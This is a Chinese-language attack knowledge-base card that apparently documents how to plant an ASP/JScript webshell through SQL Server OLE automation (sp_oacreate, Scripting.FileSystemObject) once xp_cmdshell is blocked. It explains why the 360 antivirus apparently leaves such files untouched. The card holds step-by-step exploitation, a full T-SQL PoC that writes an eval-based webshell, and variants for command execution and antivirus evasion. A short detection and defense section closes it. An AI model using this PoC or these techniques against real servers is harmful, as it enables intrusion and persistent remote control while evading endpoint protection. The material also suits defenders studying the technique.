---
id: web-generic-sqli-mssql-ole-fso-write-webshell-av-survive
title: sp_oacreate Scripting.FileSystemObject 以数据库服务账户落盘 ASP 木马：不走 HTTP 上传、文件属主为高权限进程，360 等杀软不查杀且低权木马会话改不动该文件
type: scenario
domain: web
path: web/generic/sqli
technique: mssql-ole-fso-webshell-write-av-survive
tags:
- mssql
- sql-server
- ole-automation
- com
- filesystemobject
- webshell
- av-evasion
- file-write
- privilege
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3
  verified_at: '2026-11-08T00:46:17+08:00'
  notes: 已对照原文与 10 张图核对：图06 sp_oacreate scripting.filesystemobject + createtextfile + writeline 完整语句与报错（Ole Automation Procedures 被关闭）；图07 开启后用同一段 T-SQL 返回 OK/时间 0.157s，写入 JScript eval 型木马；图08 蚁剑目录列表、图09 whoami=iis 且 net user 拒绝访问；图10 杀软识别出 360tray.exe/ZhuDongFangYu.exe。卡内 PoC 的 sp_oacreate/createtextfile/writeline 三段与原文一致（原文写 muma.asp、卡内示例把 Request.Item[2015.] 的键替换为 pass，属占位改写）。已修 2 处措辞：把「杀软为什么不杀」与「为什么改不动」明确标为原文作者的事后归因（原文原话为「最终解释权给到了权限问题」，且「本轮上传后下一秒被杀」为原文实测现象），避免读成厂商确认的通用结论。未验证点：未在 MSSQL+360 环境复跑、未核实落盘文件 ACL 的实际属主。
url: /docs/web/generic/sqli/web-generic-sqli-mssql-ole-fso-write-webshell-av-survive/
draft: false
kb_aliases:
- OLE 自动化写 WebShell
- sp_oacreate scripting.filesystemobject
- createtextfile writeline 写马
- Ole Automation Procedures 开启写马
- 数据库落盘木马不被杀软查杀
- sp_oamethod writeline aspx/asp/asp
---

## 一句话结论

`xp_cmdshell` 不可用时，用 `sp_oacreate` 实例化 `Scripting.FileSystemObject` 再 `createtextfile` + `writeline` 把 ASP/JScript 木马直接写入 Web 目录，落地文件的属主是 SQL Server 服务账户（服务级高权限），既没有 HTTP 上传流量、也不经过 Web 用户的上传路径，360 一类终端杀软对随后「通过木马会话上传」的木马会立刻查杀，却不会杀掉这个由数据库进程创建的脚本；反过来，拿到 IIS 低权会话后也无法修改/覆盖该文件（权限不足），表现为「能连能执行但改不了」。

## 原理

- **OLE 自动化是 T-SQL 侧的 COM 调用**：`sp_oacreate '<ProgID>', @obj OUT` 在 SQL Server 进程内创建 COM 对象，`sp_oamethod @obj, 'method', @ret OUT, <args>` 调用其方法。`Scripting.FileSystemObject` 提供 `CreateTextFile(path, overwrite)` 与 `WriteLine(text)`，两条调用即可把任意文本写成文件，进程身份是 SQL Server 服务账户（常见 `NT SERVICE\MSSQLSERVER`、`NetworkService` 或配置的域账户）。
- **前置开关**：`Ole Automation Procedures` 默认关闭（安全考虑），sysadmin 需 `sp_configure 'show advanced options',1` + `RECONFIGURE`、`sp_configure 'Ole Automation Procedures',1` + `RECONFIGURE` 后才可调用；与 `xp_cmdshell` 是两个独立开关，前者只涉及 COM 实例化、不经过 `CreateProcess`，所以「命令执行被拦」并不等于「写文件也被拦」。
- **为什么杀软不杀数据库写出的文件**（原文的归因为作者事后推测：权限差异 + 无网络传输，非厂商确认）：终端杀软的实时防护主要盯两类事件——HTTP/FTP 等网络传输中的文件流、以及由用户态浏览器/办公软件/Web 进程写入的可执行/脚本文件（按写入进程的信任级别与来源判定）。由数据库服务进程在本地直接 `CreateTextFile` 产生的文件既没有网络流转，写入者也属于系统级服务，实时防护通常不做拦截；而后续通过蚁剑会话上传的木马会触发「不信任进程写入脚本」的规则并被立即隔离（原文现象：上传成功后下一秒即被杀）。
- **为什么改不动**：文件属主与 ACL 由数据库服务账户决定（常见为 SYSTEM/服务账户 + 继承的服务目录权限），IIS 应用池身份（如 `iis apppool\...`）只是「读+执行」的执行者，没有写权限；于是攻击者能用它执行命令、却无法在其上二次上传或覆盖，这也从侧面印证了「不是普通上传落盘」（原文只写「我还修改不了从数据库生成的木马文件，最终解释权给到了权限问题」，属作者推断）。
- **效益**：这一姿势把「需要命令执行」降级为「只需能执行 T-SQL + 知道 Web 绝对路径」，绕开被拦的 `xp_cmdshell` 与被杀的上传通道，是数据库权限直接换 Web 控制权的典型路径。

## 触发条件

- 拥有 SQL Server 的 sysadmin（或可执行 `sp_configure`/`sp_oacreate` 的等价权限），`Select IS_SRVROLEMEMBER('sysadmin')` 为 1。
- `Ole Automation Procedures` 可被开启（未被策略强制锁定）；`xp_cmdshell` 不可用或被安全产品拦截。
- 已知 Web 站点的绝对路径（可通过 `xp_dirtree` 枚举得到），且 SQL Server 服务账户对 Web 目录有写权限。
- 目标站点按扩展名解析脚本（`.asp`/`.aspx`/`.ashx` 等），IIS 对应 ISAPI/CGI 已启用。
- 终端装有杀软（本场景为 360），且其策略表现为「杀上传的木马、不杀数据库写入的文件」。

## 利用步骤

1. 确认权限：`Select IS_SRVROLEMEMBER('sysadmin');` → 1。
2. 尝试 `exec master..xp_cmdshell 'whoami';`；若返回 `调用 'CreateProcess' 失败，错误代码: '5'`，判定命令执行通道不可用，转 OLE。
3. 开启 OLE 自动化：`EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures',1; RECONFIGURE;`。
4. 用 `xp_dirtree` 得到站点绝对路径（如 `d:\<业务目录>\`）。
5. 执行 FSO 写马：创建对象 → `createtextfile` 指向 `d:\<业务目录>\muma.asp`（overwrite=1）→ `writeline` 写入 ASP/JScript 一句话（`eval` 型），返回 OK。
6. 浏览器/蚁剑访问 `http://target/muma.asp`，用一句话连接执行命令，确认 Web 控制权。
7. 通过该会话尝试上传后门 exe/dll：观察是否被立即删除（本场景 360 实时防护会杀掉），并 `tasklist /SVC` 确认杀软进程（如 `360tray.exe`、`ZhuDongFangYu.exe`）。
8. 记录「能执行但不能覆盖该脚本」的现象：后续上传操作失败或文件保持原样，说明落盘文件的 ACL 属于数据库服务账户。

## PoC

```sql
-- 0) 权限确认
Select IS_SRVROLEMEMBER('sysadmin');

-- 1) 命令执行不可用（被拦）时的返回
exec master..xp_cmdshell 'whoami';

-- 2) 开启 OLE 自动化
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;

-- 3) 用 FSO 落盘 ASP 木马
declare @o int, @f int, @t int, @ret int
exec sp_oacreate 'scripting.filesystemobject', @o out
exec sp_oamethod @o, 'createtextfile', @f out, 'd:\<站点目录>\muma.asp', 1
exec @ret = sp_oamethod @f, 'writeline', NULL,
'<%@ Page Language="Jscript" validateRequest="false" %>
<%
function xxxx(str)
{
    return eval(str,"unsafe");
}
%>
<%var a = Request.Item["pass"];%>
<%var b = xxxx(a);%>
<%Response.Write(b);%>'
```

执行返回（原文 `信息` 面板）：`> OK`，`时间: 0.157s`。

若 `Ole Automation Procedures` 未开启，报错形如：

```text
> [42000] [Microsoft][SQL Server Native Client 10.0][SQL Server]SQL Server
  阻止了对组件 "Ole Automation Procedures" 的过程 "sys.sp_OACreate" 的访问，
  因为此组件已作为此服务器安全配置的一部分而被关闭。
```

落地后用蚁剑连接 `http://target/muma.asp`（密码即 `Request.Item` 的键名），确认命令执行；随后上传后门会被杀软即时查杀。

PoC 未在本机执行。

## 变体与关联

- **COM 对象变体**：`WScript.Shell` 的 `Run`/`Exec` 可执行命令（等同 `xp_cmdshell` 的替代）；`Scripting.FileSystemObject` 的 `CopyFile`/`MoveFile` 可覆盖或移动已有文件；`ADODB.Stream` 可写二进制（适合落地 exe/dll，但同样会被 AV 静态查杀，需配合免杀）。
- **开关绕过变体**：若 `Ole Automation Procedures` 被策略锁定，可换 `sp_makewebtask`、日志/差异备份写马、`OPENROWSET` + `BULK` 写入等其它落盘路径（见关联卡）。
- **杀软差异**：本卡的「不查杀」结论来自 360 场景的实测现象，EDR 若对服务进程写脚本也做行为规则则可能拦；上线前应按目标 EDR 评估。
- **关联**：[[web-generic-sqli-mssql-xp-dirtree-webroot-enumeration]]（拿到写马所需绝对路径）、[[web-generic-sqli-mssql-backup-sp-makewebtask-webshell]]（同样绕过 `xp_cmdshell` 的另一类写马）、[[web-generic-sqli-mssql-stacked-xp-cmdshell]]（OLE 自动化执行命令的通用原理）、[[web-php-rce-xinhu-copymode-get-defined-vars-av-bypass]]（同为「写马被 AV 拦后的绕过」但走的是二次写入变体）。
- **边界**：`xp_cmdshell` 与 OLE 均被锁死、SQL Server 服务账户对 Web 目录无写权限、站点不解析目标扩展名、或 EDR 对服务进程写入脚本有行为拦截时，本链不成立；落地文件属主决定「可执行不可改」，若需要可改需另找同权限写入点。

## 检测与防御

- **配置面**：保持 `Ole Automation Procedures`、`xp_cmdshell`、`Ad Hoc Distributed Queries` 默认关闭并用策略锁定；审计 `sp_configure` 变更（这些变更会写入 ERRORLOG）。
- **文件面**：对 Web 目录新增脚本做完整性基线（哈希/属主/创建进程），尤其注意属主为 SQL Server 服务账户的脚本文件；对数据库服务账户授予的目录写权限做最小化（Web 根不应授予服务账户写权限）。
- **检测信号**：`sp_oacreate`/`sp_oamethod` 的调用（扩展事件/审计）、ERRORLOG 中 `Ole Automation Procedures` 由 0 变 1、Web 目录在无 HTTP 上传请求的时间点出现新 `.asp/.aspx` 文件、`tasklist /SVC` 一类杀软枚举行为。
- **响应**：发现此类落盘即按「Web 已被控制」处置：隔离主机、审计该目录全部脚本、核查数据库账号是否泄露、轮换数据库凭据。
